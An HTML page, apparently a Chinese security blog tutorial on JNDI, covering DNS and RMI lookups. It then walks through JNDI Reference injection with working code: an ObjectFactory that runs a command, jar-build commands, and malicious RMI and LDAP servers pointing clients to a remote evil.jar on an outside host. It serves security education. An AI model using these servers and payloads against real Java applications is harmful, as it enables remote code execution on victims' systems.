@@ -1,0 +1,590 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>JNDI基础 | Xyuxu</title>
+<link rel="shortcut icon" href="https://xyuxu23.github.io/favicon.ico?v=1764240827433">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xyuxu23.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="JNDI基础 | Xyuxu - Atom Feed" href="https://xyuxu23.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="JNDI(Java Naming and Directory Interface) 是Java提供的Java 命名和目录接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。
+JNDI是Java EE的重要部分，可访问的现有的目..." />
+    <meta name="keywords" content="JavaSec" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xyuxu23.github.io">
+  <img class="avatar" src="https://xyuxu23.github.io/images/avatar.png?v=1764240827433" alt="">
+  </a>
+  <h1 class="site-title">
+    Xyuxu
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              JNDI基础
+            </h2>
+            <div class="post-info">
+              <span>
+                2025-11-27
+              </span>
+              <span>
+                11 min read
+              </span>
+              
+                <a href="https://xyuxu23.github.io/JavaSec/" class="post-tag">
+                  # JavaSec
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://xyuxu23.github.io/post-images/GD75xamwMe.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>JNDI(Java Naming and Directory Interface) 是Java提供的Java 命名和目录接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。</p>
+<p>JNDI是Java EE的重要部分，可访问的现有的目录及服务有:JDBC、DNS、RMI、LDAP等等</p>
+<p><strong>Naming Service 命名服务：</strong></p>
+<p>命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：DNS系统将计算机名和IP地址进行关联、文件系统将文件名和文件句柄进行关联等等。</p>
+<p><strong>Directory Service 目录服务：</strong></p>
+<p>目录服务是命名服务的扩展，除了提供名称和对象的关联，<strong>还允许对象具有属性</strong>。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。</p>
+<p><strong>Reference 引用：</strong></p>
+<p>在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。</p>
+<h1 id="IIX5V">JNDI目录服务</h1>
+<h2 id="CwbkQ">JNDI-DNS解析</h2>
+接下来先来讲讲JNDI的基本使用，Jndi调用DNS服务
+<pre><code class="language-java">package com.xyuxu.javasec.JNDI;
+
+import javax.naming.Context;
+import javax.naming.directory.Attributes;
+import javax.naming.directory.DirContext;
+import javax.naming.directory.InitialDirContext;
+import java.util.Hashtable;
+
+public class DnsContextFactory {
+
+    public static void main(String[] args) throws Exception {
+
+        Hashtable env = new Hashtable&lt;&gt;();
+        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.dns.DnsContextFactory&quot;);
+        env.put(Context.PROVIDER_URL,&quot;dns://8.8.8.8/&quot;);
+
+        DirContext dirContext = new InitialDirContext(env);
+        Attributes attrs = dirContext.getAttributes(&quot;baidu.com&quot;,new String[]{&quot;TXT&quot;});
+        Attributes attrs1 = dirContext.getAttributes(&quot;google.com&quot;,new String[]{&quot;TXT&quot;});
+        System.out.println(attrs);
+        System.out.println(attrs1);
+
+    }
+}
+
+</code></pre>
+<p>运行结果</p>
+<figure data-type="image" tabindex="1"><img src="https://xyuxu23.github.io/post-images/1764233622623.png" alt="" loading="lazy"></figure>
+<p>常见的DNS记录类型还有：</p>
+<ul>
+<li>&quot;AAAA&quot;: IPv6地址记录</li>
+<li>&quot;MX&quot;: 邮件交换记录</li>
+<li>&quot;TXT&quot;: 文本记录，常用于SPF、DKIM等</li>
+<li>&quot;NS&quot;: 域名服务器记录</li>
+<li>&quot;CNAME&quot;: 规范名称记录，即别名</li>
+<li>&quot;PTR&quot;: 指针记录，用于反向DNS查找</li>
+</ul>
+<h2 id="LLiBX">JNDI-RMI远程方法调用</h2>
+JNDI调用RMI服务
+<p>首先创建一个RMIServer，RMI对象引用要有一个继承Remote的接口 ，然后还需要实现一个类继承这个接口，然后继承 <font style="color:#080808;background-color:#ffffff;">UnicastRemoteObject 这个类。</font></p>
+<p><font style="color:#080808;background-color:#ffffff;">远程对象接口</font></p>
+<pre><code class="language-java">package com.xyuxu.javasec.RMI;
+
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+public interface IRemoteObj extends Remote {
+
+    public String sayHello() throws  RemoteException;
+    public String sayHello(Object name) throws RemoteException;
+    public String sayGoodbye()  throws RemoteException;
+
+}
+
+</code></pre>
+<p>远程对象类</p>
+<pre><code class="language-java">package com.xyuxu.javasec.RMI;
+
+import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class IRemoteObjImpl extends UnicastRemoteObject implements IRemoteObj {
+
+    public IRemoteObjImpl() throws RemoteException {
+    }
+
+    @Override
+    public String sayHello() {
+        return &quot;Hello,My Friend!&quot;;
+    }
+
+    @Override
+    public String sayHello(Object name) throws RemoteException {
+
+        return name.getClass().getName();
+    }
+
+    @Override
+    public String sayGoodbye() throws RemoteException {
+        return &quot;Goodbye,My Friend!&quot;;
+    }
+
+}
+
+</code></pre>
+<p>RMI服务端到此就创建成功了。</p>
+<pre><code class="language-java">package com.xyuxu.javasec.RMI;
+
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMIServer {
+
+    public static void main(String[] args) throws Exception {
+
+        IRemoteObj remoteObj=new IRemoteObjImpl();
+        Registry registry = LocateRegistry.createRegistry(1099);
+        registry.bind(&quot;remoteObj&quot;, remoteObj);
+        System.out.println(&quot;RMI server start at : 127.0.0.1:1099 &quot;);
+    }
+}
+
+</code></pre>
+<p>JNDI RMI客户端</p>
+<pre><code class="language-java">package com.xyuxu.javasec.JNDI;
+
+import com.xyuxu.javasec.RMI.IRemoteObj;
+
+import javax.naming.InitialContext;
+
+public class RMIRegistryContextFactory {
+
+    public static void main(String[] args) throws Exception {
+        //原始JDNI调用RMI
+//        String provideURL=&quot;rmi://127.0.0.1:1099&quot;;
+//        Hashtable env=new Hashtable();
+//        env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+//        env.put(Context.PROVIDER_URL,provideURL);
+//
+//
+//        DirContext dirContext=new InitialDirContext(env);
+//        IRemoteObj remoteObj=(IRemoteObj)dirContext.lookup(&quot;remoteObj&quot;);
+
+        //JNDI支持协议支持转换,可以简化为:
+        InitialContext initialContext = new InitialContext();
+        IRemoteObj remoteObj= (IRemoteObj) initialContext.lookup(&quot;rmi://127.0.0.1:1099/remoteObj&quot;);
+
+        String out=remoteObj.sayHello();
+        System.out.println(out);
+
+    }
+
+}
+
+</code></pre>
+<p>执行结果：</p>
+<figure data-type="image" tabindex="2"><img src="https://xyuxu23.github.io/post-images/1764233682629.png" alt="" loading="lazy"></figure>
+<p>可以对比一下原始RMI客户端的实现：</p>
+<pre><code class="language-java">package com.xyuxu.javasec.RMI;
+
+import java.rmi.NotBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMIClient {
+
+    public static void main(String[] args) throws RemoteException, NotBoundException {
+
+        Registry registry= LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);
+        IRemoteObj remoteObj=(IRemoteObj)registry.lookup(&quot;remoteObj&quot;);
+        System.out.println(remoteObj.sayHello());
+    }
+}
+</code></pre>
+<h1 id="ngpXJ">JNDI协议转换</h1>
+如果`JNDI`在`lookup`时没有指定初始化工厂名称，会自动根据协议类型动态查找内置的工厂类然后创建处理对应的服务请求。  `JNDI`默认支持自动转换的协议有：  
+<table>
+<thead>
+<tr>
+<th>协议名称</th>
+<th>协议URL</th>
+<th>Context类</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DNS协议</td>
+<td><code>dns://</code></td>
+<td><code>com.sun.jndi.url.dns.dnsURLContext</code></td>
+</tr>
+<tr>
+<td>RMI协议</td>
+<td><code>rmi://</code></td>
+<td><code>com.sun.jndi.url.rmi.rmiURLContext</code></td>
+</tr>
+<tr>
+<td>LDAP协议</td>
+<td><code>ldap://</code></td>
+<td><code>com.sun.jndi.url.ldap.ldapURLContext</code></td>
+</tr>
+<tr>
+<td>LDAP协议</td>
+<td><code>ldaps://</code></td>
+<td><code>com.sun.jndi.url.ldaps.ldapsURLContextFactory</code></td>
+</tr>
+<tr>
+<td>IIOP对象请求代理协议</td>
+<td><code>iiop://</code></td>
+<td><code>com.sun.jndi.url.iiop.iiopURLContext</code></td>
+</tr>
+<tr>
+<td>IIOP对象请求代理协议</td>
+<td><code>iiopname://</code></td>
+<td><code>com.sun.jndi.url.iiopname.iiopnameURLContextFactory</code></td>
+</tr>
+<tr>
+<td>IIOP对象请求代理协议</td>
+<td><code>corbaname://</code></td>
+<td><code>com.sun.jndi.url.corbaname.corbanameURLContextFactory</code></td>
+</tr>
+</tbody>
+</table>
+<p>RMI示例:</p>
+<pre><code class="language-java">// 创建JNDI目录服务上下文
+InitialContext context = new InitialContext();
+
+// 查找JNDI目录服务绑定的对象
+Object obj = context.lookup(&quot;rmi://127.0.0.1:9527/test&quot;);
+</code></pre>
+<h1 id="UFAsy">JNDI-Reference</h1>
+在`JNDI`服务中允许使用系统以外的对象，比如在某些目录服务中直接引用远程的Java对象，但遵循一些安全限制。  
+<h2 id="VCZSC">RMI/LDAP远程对象引用安全限制</h2>
+<ol>
+<li>
+<p>在RMI服务中引用远程对象将受本地Java环境限制即本地的java.rmi.server.useCodebaseOnly配置必须为false(允许加载远程对象)，如果该值为true则禁止引用远程对象。</p>
+</li>
+<li>
+<p>被引用的ObjectFactory对象还将受到com.sun.jndi.rmi.object.trustURLCodebase配置限制，如果该值为false(不信任远程引用对象)一样无法调用远程的引用对象。</p>
+</li>
+<li>
+<p>JDK 5 U45,JDK 6 U45,JDK 7u21,JDK 8u121开始java.rmi.server.useCodebaseOnly默认配置已经改为了true。</p>
+</li>
+<li>
+<p>JDK 6u132, JDK 7u122, JDK 8u113开始com.sun.jndi.rmi.object.trustURLCodebase默认值已改为了false。</p>
+</li>
+<li>
+<p>LDAP在JDK 11.0.1、8u191、7u201、6u211后也将默认的com.sun.jndi.ldap.object.trustURLCodebase设置为了false。</p>
+</li>
+</ol>
+<p>本地测试远程对象引用可以使用如下方式允许加载远程的引用对象：</p>
+<pre><code class="language-java">System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;);
+System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);
+</code></pre>
+<h2 id="mIeWy">创建恶意的ObjectFactory对象</h2>
+<p>JNDI允许通过对象工厂 (javax.naming.spi.ObjectFactory)动态加载对象实现，</p>
+<p>对象工厂必须实现 javax.naming.spi.ObjectFactory接口并重写getObjectInstance方法。</p>
+<p><strong>ReferenceObjectFactory示例代码：</strong></p>
+<pre><code class="language-java">package com.xyuxu.javasec.JNDI;
+
+import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.util.Hashtable;
+
+public class ReferenceObjectFactory implements ObjectFactory {
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {
+        return Runtime.getRuntime().exec(&quot;calc&quot;);
+    }
+}
+</code></pre>
+<pre><code class="language-java">javac -encoding UTF-8  ./ReferenceObjectFactory.java    //编译成Class文件
+jar cvf  evil.jar  ./RefereceObjectFactory.class 	// 编译成Jar包
+</code></pre>
+<h2 id="yj3al">创建恶意的RMI服务</h2>
+<p>如果我们在RMI服务端绑定一个恶意的引用对象，RMI客户端在获取服务端绑定的对象时发现是一个Refence对象后，就会检查当前JVM是否允许加载远程引用对象。如果允许加载且本地不存在此对象工厂类则使用URLClassLoader加载远程的jar，并加载我们构建的恶意对象工厂(ReferenceObjectFactory)类然后后调用其中的getObjectInstance方法从而触发该方法中的恶意RCE代码。</p>
+<p>通俗来讲也就是</p>
+<p><strong>包含恶意攻击的RMI服务端代码：</strong></p>
+<pre><code class="language-java">package com.xyuxu.javasec.JNDI;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.Reference;
+import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+public class RMIReferenceServer {
+
+    public static void main(String[] args) throws Exception {
+
+        String url=&quot;http://test.xyuxu.top/evil.jar&quot;;
+        String className=&quot;com.xyuxu.javasec.JNDI.ReferenceObjectFactory&quot;;
+        LocateRegistry.createRegistry(1099);
+
+        //Reference对象
+        Reference reference = new Reference(className, className, url);
+        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
+
+        //如果RMI服务绑定的是Reference工厂对象,那么在调用的时候，会调用工厂得到的类
+        Naming.bind(&quot;rmi://127.0.0.1:1099/remoteObj&quot;,referenceWrapper);
+
+        System.out.printf(&quot;RMI Server Started\n:rmi://127.0.0.1:1099/remoteObj&quot;);
+    }
+
+}
+
+</code></pre>
+<p>客户端代码</p>
+<pre><code class="language-java">package com.xyuxu.javasec.JNDI;
+
+import javax.naming.InitialContext;
+
+public class RMIReferenceClient {
+
+    public static void main(String[] args) throws Exception {
+        InitialContext initialContext = new InitialContext();
+        Object obj =initialContext.lookup(&quot;rmi://127.0.0.1:1099/remoteObj&quot;);
+        System.out.println(&quot;obj =&quot; + obj);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://xyuxu23.github.io/post-images/1764233727181.png" alt="" loading="lazy"></figure>
+<h2 id="iFhsl">创建恶意LDAP服务</h2>
+LDAP服务:
+<pre><code class="language-java">package com.xyuxu.javasec.JNDI;
+
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import java.net.InetAddress;
+
+public class LDAPReferenceServer {
+
+    public static final int SERVER_PORT = 3000;
+    public static final String BIND_HOST =&quot;127.0.0.1&quot;;
+    public static final String LDAP_ENTRY_NAME=&quot;sec&quot;;
+    public static String LDAP_URL=&quot;ldap://&quot;+BIND_HOST+&quot;:&quot;+SERVER_PORT+&quot;/&quot;+LDAP_ENTRY_NAME;
+
+    //恶意远程jar,包含恶意攻击对象的工厂类
+    public static final String REMOTE_REFERENCE_JAR =&quot;http://test.xyuxu.top/evil.jar&quot;;
+
+    private static final String LDAP_BASE=&quot;dc=javasec,dc=xyuxu&quot;;
+
+    public static void main(String[] args) throws Exception {
+
+        InMemoryDirectoryServerConfig config =new InMemoryDirectoryServerConfig(LDAP_BASE);
+
+        config.setListenerConfigs(new InMemoryListenerConfig(
+                &quot;listen&quot;, InetAddress.getByName(BIND_HOST),SERVER_PORT,
+                ServerSocketFactory.getDefault(), SocketFactory.getDefault(),
+                (SSLSocketFactory) SSLSocketFactory.getDefault()
+        ));
+
+        // 添加自定义的LDAP操作拦截器
+        config.addInMemoryOperationInterceptor(new OperationInterceptor());
+
+        // 创建LDAP服务对象
+        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+
+        // 启动服务
+        ds.startListening();
+
+        System.out.println(&quot;LDAP服务启动成功,服务地址：&quot; + LDAP_URL);
+
+    }
+
+
+    private static class OperationInterceptor extends InMemoryOperationInterceptor {
+
+        @Override
+        public void processSearchResult(InMemoryInterceptedSearchResult result) {
+            String base = result.getRequest().getBaseDN();
+            Entry entry = new Entry(base);
+
+            try {
+                // 设置对象的工厂类名
+                String className = &quot;com.xyuxu.javasec.JNDI.ReferenceObjectFactory&quot;;
+                entry.addAttribute(&quot;javaClassName&quot;, className);
+                entry.addAttribute(&quot;javaFactory&quot;, className);
+
+                // 设置远程的恶意引用对象的jar地址
+                entry.addAttribute(&quot;javaCodeBase&quot;, REMOTE_REFERENCE_JAR);
+
+                // 设置LDAP objectClass
+                entry.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);
+
+                result.sendSearchEntry(entry);
+                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+            } catch (Exception e1) {
+                e1.printStackTrace();
+            }
+        }
+
+
+    }
+
+}
+
+</code></pre>
+<p>JNDI LDAP客户端</p>
+<pre><code class="language-java">package com.xyuxu.javasec.JNDI;
+
+import javax.naming.InitialContext;
+
+import static com.xyuxu.javasec.JNDI.LDAPReferenceServer.LDAP_URL;
+
+public class LDAPReferenceClient {
+
+    public static void main(String[] args) throws Exception {
+
+        InitialContext ctx = new InitialContext();
+        Object obj=ctx.lookup(LDAP_URL);
+        System.out.println(obj);
+    }
+}
+
+</code></pre>
+<p>运行结果:</p>
+<figure data-type="image" tabindex="4"><img src="https://xyuxu23.github.io/post-images/1764233750091.png" alt="" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xyuxu23.github.io/hanbaobaichi/">
+              <h3 class="post-title">
+                汉堡白吃？某连锁餐饮 App 竟藏&#34;0元购&#34;漏洞！
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xyuxu23.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
